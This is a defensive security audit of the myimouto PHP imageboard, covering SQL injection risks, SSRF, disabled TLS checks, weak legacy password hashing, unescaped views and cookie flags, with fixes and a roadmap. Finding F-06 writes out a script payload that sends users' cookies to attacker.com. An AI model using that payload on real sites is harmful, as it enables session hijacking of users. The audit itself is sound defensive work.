# Deep Security Audit — myimouto

## Overview

**Tech stack:** PHP 8.5+, custom Rails-inspired framework (`railsphp`), MySQL 8.0+/MariaDB 10.6+, Apache (.htaccess), PHPMailer for email.

**Auth mechanism:** Session-based (server-side `user_id` + `ph` token), with a parallel remember-token cookie path and API-key path. User levels range from 0 (anonymous) to 50 (admin).

**Attack surface:** 43 controllers, 310-line route file accepting `GET` and `POST` on most mutating endpoints, publicly reachable file upload, URL-source download, API endpoints, admin/mod panels.

---

## Findings

### F-01: Unfiltered Arbitrary Data Written to Log File (user#error)

- **Risk Level:** High
- **OWASP Category:** A03 Injection / A09 Logging Failures
- **Vulnerability:** `UserController::error()` at `/d/repos/myimouto/myimouto/app/controllers/UserController.php` lines 640-652 appends the raw `$report` parameter (unsanitized, unlimited size, from any unauthenticated caller because no auth filter guards the `error` action) directly to `log/user_errors.log` with `file_put_contents(..., FILE_APPEND)`. There is no auth check, no size cap, and no content sanitization. The same pattern exists in `PostController::error()` (line 1135, same pattern).
- **Exploit Scenario:**
  1. Attacker sends repeated `POST /user/error?report=<megabytes of garbage>` requests without any credentials.
  2. The log file grows unboundedly, filling available disk space, causing denial of service to the web server and database.
  3. Alternatively, attacker injects structured log-poison strings (fake stack traces, null bytes, ANSI sequences) that break log monitoring tooling or exploit log parsers downstream.
  4. If a log-ingestion pipeline (ELK, Graylog) ever reads these files without sanitation, secondary log-injection attacks are possible.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/UserController.php:640-652`, `/d/repos/myimouto/myimouto/app/controllers/PostController.php:1135` (analogous)
- **Hardening Measure:** Add `member_only` before filter to `error` action; cap payload length (e.g., 2 KB); sanitize non-printable characters before writing.
- **Effort:** S

---

### F-02: Unsanitized IDs in Raw SQL `IN` Clause (post#updateBatch)

- **Risk Level:** High
- **OWASP Category:** A03 Injection (SQL Injection)
- **Vulnerability:** `PostController::updateBatch()` lines 204-248 collects IDs from `Post::find()` calls (safe), but at line 246-248 joins them with `implode(', ', $ids)` and interpolates the result directly into a raw SQL query string: `Post::where("id IN ($ids)")`. If any `Post::find()` call silently returns an object whose `->id` attribute contains crafted SQL (possible via corrupted DB data or if the ORM ever returns a string for `id`), the string is interpolated verbatim into the SQL. More critically, the current code trusts that all entries in `$ids` are integers retrieved from `$p->id` after a `find()`, but there is no explicit integer cast. Future regression or framework quirk could expose a classic `IN (...)` injection.
- **Exploit Scenario:** As-is, exploitation requires database corruption. However the pattern is fragile — a single refactor that sources IDs from params instead of from model instances would be a critical injected vulnerability. The pattern should be replaced defensively.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/PostController.php:246-248`
- **Hardening Measure:** Replace with `Post::where(['id' => $ids])` or cast all elements with `array_map('intval', $ids)` before interpolation.
- **Effort:** S

---

### F-03: SSRF via `data:` URL in `Danbooru::http_get_streaming()`

- **Risk Level:** High
- **OWASP Category:** A10 SSRF
- **Vulnerability:** `Danbooru::http_get_streaming()` at `/d/repos/myimouto/myimouto/lib/Danbooru.php` lines 10-13 explicitly decodes `data:` URLs via `base64_decode()` and returns the raw binary blob before any hostname/SSRF check is applied. This means if any code path passes a `data:` URL to this function (including from user-controlled `source` fields in post creation), the URL whitelist and SSRF guards in `UploadWhitelist::is_allowed()` and `StagingService::isSafeSourceUrl()` are bypassed entirely.
- **Exploit Scenario:**
  1. Attacker submits a post with `source = "data:text/html;base64,<base64-encoded payload>"`.
  2. `download_source()` in `PostFileMethods` is called; it calls `UploadWhitelist::is_allowed()` but that function checks `parse_url()` which returns an empty `host` for `data:` URLs, causing early return `['allowed' => false, ...]`.
  3. However, `Danbooru::http_get_streaming()` intercepts `data:` URLs before the cURL code and returns the decoded payload directly. Any caller that does not go through `UploadWhitelist` first (e.g., future job tasks, admin import) would fetch arbitrary base64-encoded binary data.
  4. The payload is saved as a staged file, bypassing content-type validation (since no server is actually fetched).
- **Affected Code:** `/d/repos/myimouto/myimouto/lib/Danbooru.php:10-13`
- **Hardening Measure:** Remove the `data:` URL shortcut entirely, or move the URL scheme validation before the `data:` branch so it is rejected first.
- **Effort:** S

---

### F-04: TLS Certificate Verification Disabled in cURL Calls

- **Risk Level:** High
- **OWASP Category:** A02 Cryptographic Failures
- **Vulnerability:** `Danbooru::http_get_streaming()` at `/d/repos/myimouto/myimouto/lib/Danbooru.php` lines 48-49 sets `CURLOPT_SSL_VERIFYPEER = false` and `CURLOPT_SSL_VERIFYHOST = false` for all HTTPS requests. This eliminates all TLS certificate validation, making every HTTPS source download vulnerable to man-in-the-middle attacks.
- **Exploit Scenario:**
  1. On a network path between the server and a whitelisted upload source, an attacker performs ARP spoofing or BGP hijacking.
  2. The attacker presents a self-signed certificate for the target hostname.
  3. Because peer verification is disabled, the PHP application accepts the certificate.
  4. Attacker serves crafted image files (oversized files, polyglot content, malformed images) that exploit parsing vulnerabilities in GD/ImageMagick during thumbnail generation.
- **Affected Code:** `/d/repos/myimouto/myimouto/lib/Danbooru.php:47-49`
- **Hardening Measure:** Remove `CURLOPT_SSL_VERIFYPEER = false` and `CURLOPT_SSL_VERIFYHOST = false`. Configure `CURLOPT_CAINFO` to point to a system CA bundle if needed.
- **Effort:** S

---

### F-05: Hardcoded Public-Domain SHA-1 Password Salt in Default Config

- **Risk Level:** High
- **OWASP Category:** A02 Cryptographic Failures / A07 Authentication Failures
- **Vulnerability:** `/d/repos/myimouto/myimouto/config/default_config.php` line 23 contains `public $user_password_salt = 'choujin-steiner'`. This is the original Moebooru salt, publicly documented in the Danbooru/Moebooru source history and known to rainbow table databases. The SHA-1 legacy path in `User::sha1()` still uses this salt: `sha1('choujin-steiner--' . $pass . '--')`. Accounts that have not yet been migrated to bcrypt (i.e., have `bcrypt_password_hash = null`) are protected only by this known-salt SHA-1 hash stored in `users.password_hash`. Operators who do not customize the salt before deploying are exposed.
- **Exploit Scenario:**
  1. Attacker obtains a database dump (SQL injection, misconfigured backup, insider threat).
  2. Pre-built rainbow tables for `sha1('choujin-steiner--<word>--')` crack most common passwords within minutes using publicly available Moebooru-aware wordlists.
  3. SHA-1 is fast to compute; GPU-based cracking at hundreds of millions of hashes per second is trivial on commodity hardware.
  4. Bcrypt-only accounts (migrated) are safe, but any account that has never re-authenticated since bcrypt migration retains only the legacy hash.
- **Affected Code:** `/d/repos/myimouto/myimouto/config/default_config.php:23`, `/d/repos/myimouto/myimouto/app/models/User.php:154-156`
- **Hardening Measure:** (1) Force all operators to set a unique `user_password_salt` in `config/config.php` — consider throwing an exception on boot if the default salt is still in use. (2) Add a migration that forces a bcrypt re-hash for all accounts still holding only the SHA-1 hash on next login. (3) Long-term: retire the `password_hash` column entirely after a sufficient migration window.
- **Effort:** M

---

### F-06: Stored XSS — Unescaped Ban Reason in banned/index.php

- **Risk Level:** High
- **OWASP Category:** A03 XSS
- **Vulnerability:** `/d/repos/myimouto/myimouto/app/views/banned/index.php` line 3 outputs `$this->ban->reason` without escaping: `<?= $this->ban->reason ?>`. Ban reasons are set by moderators/admins. If a malicious or compromised mod account sets a ban reason containing `<script>...</script>` or an event-handler payload, every banned user who visits `/banned` will execute the JavaScript in their browser. The `/d/repos/myimouto/myimouto/app/views/job_task/show.php` view also outputs `$this->job_task->status_message` unescaped (line 8) and `$this->job_task->task_type` (line 4) and `$this->job_task->status` (line 5) unescaped. These fields originate from the database but could be set by admin-level actions.
- **Exploit Scenario:**
  1. Compromised moderator account (or XSS chaining from another vector) is used to ban a target user with reason `<script>document.location='https://attacker.com/?c='+document.cookie</script>`.
  2. Every time the target user visits the ban page, their session cookie is exfiltrated.
  3. Since the ban page is shown to unauthenticated-but-banned users, the HttpOnly flag on `remember_token` does not protect the `login` cookie which may lack the flag.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/views/banned/index.php:3`, `/d/repos/myimouto/myimouto/app/views/job_task/show.php:4,5,8`
- **Hardening Measure:** Replace all `<?= $this->ban->reason ?>` with `<?= $this->h($this->ban->reason) ?>` (the `h()` helper performs `htmlspecialchars`). Audit all views for unescaped model output. A global search for `<?= $this->` not followed by `h(` or a whitelist-safe helper should be conducted.
- **Effort:** S

---

### F-07: MIME-Type Detection Fails for Video Files; `getimagesize()` Used

- **Risk Level:** Medium
- **OWASP Category:** A05 Security Misconfiguration / File Upload Security
- **Vulnerability:** `PostFileMethods::determine_content_type()` at `/d/repos/myimouto/myimouto/app/models/Post/FileMethods.php` lines 334-346 exclusively uses PHP's `getimagesize()` plus `image_type_to_mime_type()` for MIME detection. `getimagesize()` does not recognize video/webm or video/mp4, so it returns `false` for these files. `image_type_to_mime_type(false)` returns `null`. This null MIME type is then checked against `$MIME_TYPES` which contains `video/webm` and `video/mp4` entries, and the check (`array_key_exists(null, $MIME_TYPES)`) fails, triggering a validation error — meaning video uploads effectively do not work. Additionally, `getimagesize()` can be spoofed by embedding a valid GIF/JPEG header inside a malicious file (polyglot). A correct implementation should use `finfo_open(FILEINFO_MIME_TYPE)` on the actual file bytes.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/models/Post/FileMethods.php:334-346`
- **Hardening Measure:** Replace `getimagesize()` with `finfo_open(FILEINFO_MIME_TYPE)` for content-type detection. This uses libmagic to inspect file magic bytes and is not spoofable by header injection.
- **Effort:** M

---

### F-08: DNS Rebinding Risk in SSRF Protection (Time-of-Check/Time-of-Use)

- **Risk Level:** Medium
- **OWASP Category:** A10 SSRF
- **Vulnerability:** Both `UploadWhitelist::resolve_and_validate_host()` and `StagingService::isSafeSourceUrl()` perform a DNS lookup to validate the resolved IP against private ranges. However, neither pins the resolved IP in the subsequent cURL call. There is a TOCTOU (time-of-check/time-of-use) window: after the DNS lookup passes, a DNS rebinding attack can cause the hostname to re-resolve to an internal IP address before cURL actually connects. The `UploadWhitelist::is_allowed()` returns a `resolved_ip` field but it is never used to set `CURLOPT_RESOLVE` in `Danbooru::http_get_streaming()`.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/models/UploadWhitelist.php:91-112`, `/d/repos/myimouto/myimouto/lib/MyImouto/PostReplacement/StagingService.php:99-133`, `/d/repos/myimouto/myimouto/lib/Danbooru.php:72`
- **Hardening Measure:** Pass the pre-resolved IP to cURL using `CURLOPT_RESOLVE` (e.g., `["example.com:443:<resolved_ip>"]`) to pin the connection. This eliminates the rebinding window. The `resolved_ip` already returned by `is_allowed()` should be threaded through to `http_get_streaming()`.
- **Effort:** M

---

### F-09: Session Password-Hash Token Uses CRC32 (Not Collision-Resistant)

- **Risk Level:** Medium
- **OWASP Category:** A07 Authentication Failures
- **Vulnerability:** The session invalidation mechanism stores `crc32($user->bcrypt_password_hash)` in the session as `$session->ph`. CRC32 is a 32-bit checksum with approximately 1-in-4-billion collision probability. An attacker who knows the CRC32 value of the old password hash (e.g., from a stolen session) could potentially find a new password whose bcrypt hash collides with the same CRC32, keeping the session alive after a password change. This is a low-probability but non-zero theoretical bypass of the password-change session invalidation.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/ApplicationController.php:93-96`, `/d/repos/myimouto/myimouto/app/controllers/UserController.php:681`
- **Hardening Measure:** Replace `crc32()` with `substr(hash('sha256', $bcrypt_hash), 0, 16)` or store the first 8 bytes of the SHA-256 of the hash. This increases collision resistance from 2^32 to at least 2^64 with the same session storage footprint.
- **Effort:** S

---

### F-10: Security Headers: CSP Uses `unsafe-inline` for Scripts

- **Risk Level:** Medium
- **OWASP Category:** A05 Security Misconfiguration
- **Vulnerability:** `ApplicationController::set_security_headers()` at `/d/repos/myimouto/myimouto/app/controllers/ApplicationController.php` lines 625-628 sets a CSP with `script-src 'self' 'unsafe-inline'`. The `unsafe-inline` directive nullifies XSS protection offered by CSP, as any inline script (whether legitimate or injected) is permitted to execute.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/ApplicationController.php:625-628`
- **Hardening Measure:** Move all inline JavaScript to external files and remove `unsafe-inline`. Use CSP nonces (`'nonce-<random>'`) for any inline scripts that cannot be externalized. Additionally, `img-src` should include external image domains if any are used; the current `img-src 'self' data:` would break external image previews.
- **Effort:** L

---

### F-11: Cookies Lack `Secure` Flag on Non-HTTPS Deployments; `user_id` Cookie Not HttpOnly

- **Risk Level:** Medium
- **OWASP Category:** A02 Cryptographic Failures / A07 Authentication Failures
- **Vulnerability:** In `UserController::_save_cookies()` at line 676, the `user_id` cookie is set without `httponly => true` (only `expires` is passed). The `login` and `remember_token` cookies correctly receive `httponly => true` and `secure => $is_https`, but `user_id` is accessible to JavaScript. Additionally, the numerous info cookies set in `ApplicationController::init_cookies()` (lines 418-453) — `user_info`, `has_mail`, `forum_updated`, `comments_updated`, `my_tags`, `blacklisted_tags`, `block_reason` — are set without the framework-level `secure` or `httponly` flags, meaning they are transmitted over HTTP in non-HTTPS deployments and accessible to JavaScript.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/UserController.php:676`, `/d/repos/myimouto/myimouto/app/controllers/ApplicationController.php:419-453`
- **Hardening Measure:** Set `httponly` on `user_id`. For informational cookies that must be readable by JavaScript, explicitly set `secure => $is_https`. Establish a cookie-setting helper that enforces `SameSite=Lax` and `Secure` flags globally based on the URL scheme.
- **Effort:** S

---

### F-12: `install.php` Stores Admin Password Using SHA-1 Only

- **Risk Level:** Medium
- **OWASP Category:** A02 Cryptographic Failures
- **Vulnerability:** `/d/repos/myimouto/myimouto/install.php` lines 60-63 inserts the admin account using only `User::sha1($adminPass)` into `password_hash`, without setting `bcrypt_password_hash`. The admin account is therefore created with only the known-salt SHA-1 hash and no bcrypt protection until the admin first successfully logs in (which triggers transparent migration at `User::authenticate()` lines 110-114). Until that first login, the admin account is protected only by SHA-1.
- **Affected Code:** `/d/repos/myimouto/myimouto/install.php:60-63`
- **Hardening Measure:** In `install.php`, also set `bcrypt_password_hash = User::hashPassword($adminPass)` in the INSERT statement. The installer also advises deletion after use (`"You may delete this install.php file"`) but does not enforce it programmatically.
- **Effort:** S

---

### F-13: `user#error` Endpoint — Unauthenticated Log Write (Disk Exhaustion)

*(This is the same as F-01, but emphasizes the missing auth filter aspect.)*

Refer to F-01. The missing auth filter makes this accessible to any client on the internet.

---

### F-14: History Controller Accessible Without Authentication

- **Risk Level:** Low
- **OWASP Category:** A01 Broken Access Control
- **Vulnerability:** `/d/repos/myimouto/myimouto/app/controllers/HistoryController.php` has no auth filter for its `index` action. The `undo` action has a `member_only` filter, but browsing the full edit history of all posts, notes, pools, and wikis (including changes to rating, source, and tags) is publicly accessible. Depending on the site's content policy, this can expose sensitive metadata.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/HistoryController.php:231-234`
- **Hardening Measure:** If history access should be gated, add `no_anonymous` or `member_only` to the `index` action filter. Alternatively, document this as intentional.
- **Effort:** S

---

### F-15: Post Tag History Controller Has No Auth Filter

- **Risk Level:** Low
- **OWASP Category:** A01 Broken Access Control
- **Vulnerability:** `PostTagHistoryController` has no `filters()` method defined, meaning any user (including anonymous) can read the complete tag editing history of all posts.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/controllers/PostTagHistoryController.php`
- **Hardening Measure:** Add `no_anonymous` if tag history should be member-only, consistent with the rest of the moderation tooling.
- **Effort:** S

---

### F-16: `ExceptionLog::appVersion()` Calls `shell_exec('git ...')`

- **Risk Level:** Low
- **OWASP Category:** A05 Security Misconfiguration
- **Vulnerability:** `/d/repos/myimouto/myimouto/app/models/ExceptionLog.php` line 62 calls `shell_exec('git rev-parse --short HEAD 2>/dev/null')` at runtime during exception capture. While `git` is not user-controllable here, `shell_exec` is enabled in the runtime environment and a misconfigured `$PATH` or malicious `git` binary could be exploited. The output is cached statically so it only runs once per request, but it still represents an unnecessary use of shell execution in a web-facing process.
- **Affected Code:** `/d/repos/myimouto/myimouto/app/models/ExceptionLog.php:62`
- **Hardening Measure:** Set the app version at build time (e.g., write to a `VERSION` file during deployment) and read it with `file_get_contents()` instead of `shell_exec`.
- **Effort:** S

---

### F-17: `Horde\Text\Diff\Engine\Shell` Uses Unescaped `diff` Command

- **Risk Level:** Low
- **OWASP Category:** A03 Injection (Command Injection)
- **Vulnerability:** `/d/repos/myimouto/myimouto/vendor/Horde/Text/Diff/Engine/Shell.php` line 47 constructs a shell command via string concatenation: `shell_exec($this->_diffCommand . ' ' . $from_file . ' ' . $to_file)`. If the `$from_file` or `$to_file` values come from attacker-influenced paths, they could inject shell metacharacters. The code creates temp files but the escaping of those paths is not verified.
- **Affected Code:** `/d/repos/myimouto/myimouto/vendor/Horde/Text/Diff/Engine/Shell.php:47`
- **Hardening Measure:** Prefer the `Native` diff engine (also available in the same vendor package) which uses pure PHP and has no shell exposure. If Shell engine is needed, use `escapeshellarg()` on all path arguments.
- **Effort:** S

---

## Auth and Access Control Summary

**Authorization model:** `ApplicationController::__call()` provides a magic dispatch for `*_only()` methods. Each controller declares its own `filters()` override to gate specific actions. The global `filters()` in `ApplicationController` runs `set_current_user` and `verify_authenticity_token` on every request.

**Gaps identified:**

1. The `user#error` and `post#error` actions lack any auth filter, allowing unauthenticated log writes (F-01).
2. The History and PostTagHistory controllers expose full site history to anonymous visitors.
3. The `__call()` approach for role checks is dynamic and regex-based — a typo in a role name (e.g., `$this->mod_only()` vs. `$this->mod_or_higher_only()`) will silently call the dynamic resolver. The explicit alias methods (`admin_only()`, `member_only()`) defined at lines 495-527 are safer and should be used consistently.
4. The `blocked_only` filter in `UserController` (line 8) is a custom filter that is not defined in the parent class; its implementation is not visible in the excerpt, raising a question about its security behavior.
5. `UserDeletionController` correctly double-checks privilege levels both in the controller and in `DeletionService::staffDelete()` — defense-in-depth done correctly.
6. CSRF protection is global and correctly skips GET/HEAD/OPTIONS and API-key-authenticated requests. Token generation uses `bin2hex(random_bytes(32))` (cryptographically strong). `hash_equals()` is used for constant-time comparison.

---

## Security Headers Assessment

| Header | Status | Current Value | Recommendation |
|---|---|---|---|
| Content-Security-Policy | Warning | `script-src 'self' 'unsafe-inline'` | Remove `unsafe-inline`; use nonces |
| Strict-Transport-Security | Warning | Only set when `url_base` starts with `https://` | Enforce HTTPS in deployment; set max-age >= 31536000 |
| X-Frame-Options | Set | `SAMEORIGIN` | Acceptable; consider migrating to `frame-ancestors 'self'` in CSP |
| X-Content-Type-Options | Set | `nosniff` | Correct |
| Referrer-Policy | Set | `strict-origin-when-cross-origin` | Acceptable |
| Permissions-Policy | Missing | Not set | Add `Permissions-Policy: camera=(), microphone=(), geolocation=()` |
| CORS | Not configured | No explicit CORS headers | Verify no `Access-Control-Allow-Origin: *` in framework defaults |
| .htaccess security rules | Partial | Only URL rewriting and asset caching | Missing: directory listing disable (`Options -Indexes`), server signature suppression, block access to `.env`/`composer.json`/`log/` directories |

**Notable:** Security headers are set via an `after` filter (`set_security_headers`), which means they are emitted on every HTML and API response — good. But because the `init_cookies` after-filter runs before `set_security_headers`, any response that only calls `init_cookies` without triggering `set_security_headers` (e.g., early-terminated responses) may miss the security headers.

---

## Data Protection

1. **Password hashing:** New accounts use bcrypt at cost 12 (`password_hash($pass, PASSWORD_BCRYPT, ['cost' => 12])`). Existing unmigrated accounts retain only SHA-1 with the public default salt. Transparent migration on login is implemented.
2. **Remember token:** A 64-character random hex token is generated with `bin2hex(random_bytes(32))`. The hashed version (SHA-256) is stored in the database; the raw token is sent to the client — this is the correct pattern.
3. **Password reset tokens:** 24-hour expiry, SHA-256 stored, raw token sent by email — correct. The `validate_reset_token()` uses `hash_equals()` — correct.
4. **API keys:** Generated with `base64_encode(random_bytes(24))` (base64url, 32 chars of entropy) — adequate.
5. **Email addresses:** No evidence of encryption at rest. Stored as plaintext in `users.email`.
6. **Sensitive data in exception logs:** `ExceptionLog::capture()` logs `query` and `binds` from PDO exceptions. If bind parameters contain passwords (e.g., from a failed auth query), those are logged. The exception log is accessible to mod-level users, not just admins.
7. **SHA-1 hash retention:** Even after bcrypt migration, `password_hash` (SHA-1) is retained in the users table. Consider NULLing it after migration to reduce exposure from future dumps.
8. **install.php not auto-blocked:** The installer (`install.php`) resides in the web root accessible at the URL path `/install.php`. After installation it remains directly accessible. Only a console-level `php install.php` invocation makes practical sense (it uses `Rails\Console`), but if it is somehow reachable via web, re-running it would re-create the admin account and re-run migrations. The `.htaccess` does not block this file.

---

## Security Roadmap

### Immediate (this week)

1. **F-01** — Add `member_only` filter to `user#error` and `post#error`; cap `$report` payload to 2 KB.
2. **F-06** — Escape `$this->ban->reason` with `$this->h()` in `app/views/banned/index.php`; audit all views for unescaped model output.
3. **F-04** — Re-enable TLS peer verification in `Danbooru::http_get_streaming()`.
4. **F-02** — Replace raw SQL `IN ($ids)` with ORM array binding or explicit `intval()` cast in `PostController::updateBatch()`.
5. **F-12** — Update `install.php` to write both SHA-1 and bcrypt hashes for the admin account.
6. Block access to `install.php` in `.htaccess` (e.g., `<Files "install.php"> Require all denied </Files>`).

### Short-term (this month)

7. **F-05** — Require operators to configure a custom `user_password_salt` in `config/config.php`; add a boot-time check that throws if the default salt is still used in production.
8. **F-03** — Remove the `data:` URL shortcut from `Danbooru::http_get_streaming()`.
9. **F-09** — Replace `crc32()` with a shorter SHA-256 prefix for session password-hash tokens.
10. **F-11** — Add `httponly` to `user_id` cookie; add `secure` flag to all info cookies.
11. **F-08** — Pin the resolved IP via `CURLOPT_RESOLVE` in cURL calls after whitelist check.
12. Add `Options -Indexes` and server signature suppression to `.htaccess`.
13. Add `Permissions-Policy` security header.

### Mid-term (this quarter)

14. **F-10** — Eliminate `unsafe-inline` from CSP by externalizing inline JavaScript.
15. **F-07** — Replace `getimagesize()` with `finfo_open(FILEINFO_MIME_TYPE)` for content-type detection.
16. **F-05 (continued)** — After a migration window, null out `password_hash` (SHA-1) for all migrated accounts; remove the SHA-1 fallback code path.
17. Conduct a systematic view audit: run `grep -r "<?=" app/views/ | grep -v "h(\|t(\|linkTo\|urlFor\|submitTag\|textFieldTag\|selectTag\|labelTag\|imageTag\|compact_time\|timeAgoInWords\|format_text\|partial\|contentFor\|render\|yield\|(int)\|(float)\|(bool)"` to find all unescaped output.
18. Replace Horde Shell diff engine with Horde Native engine.

### Ongoing

- Dependency updates: audit `composer.lock` for known CVEs in `railsphp`, `phpmailer`, `horde/*`.
- Penetration testing against file upload polyglot vectors (GIF-with-PHP payload inside).
- Security monitoring: alert on log file growth rate, failed auth spikes, unusual SQL error rates.
- Consider adding CAPTCHA to registration and password reset to augment rate limiting.

---

## Security Score: 6.5/10

**Justification:**

The codebase demonstrates a genuine effort toward security: CSRF protection is implemented and uses `hash_equals()`; bcrypt at cost 12 for new passwords; remember-token uses hashed storage with `hash_equals()`; password-change session invalidation is implemented; SSRF protection exists at two levels with DNS resolution and private-IP blocking; rate limiting covers login, signup, and password reset; role-based access control is consistent across most controllers; SQL queries use parameterized binds throughout the query engine except for the one `IN ($ids)` raw-string issue.

What pulls the score down: the inherited public SHA-1 salt still protecting unmigrated legacy accounts is a known vulnerability in the Moebooru ecosystem; TLS peer verification is disabled for all outbound HTTPS fetches; the unauthenticated log-write endpoint is exploitable for disk exhaustion; there are unescaped outputs in views (ban reason, job_task fields); `data:` URL bypass in SSRF protection; and the CSP's `unsafe-inline` script directive eliminates XSS protection at the browser level. None of these individually is catastrophic given the imageboard context, but combined they represent a meaningful risk surface for a publicly deployed instance.
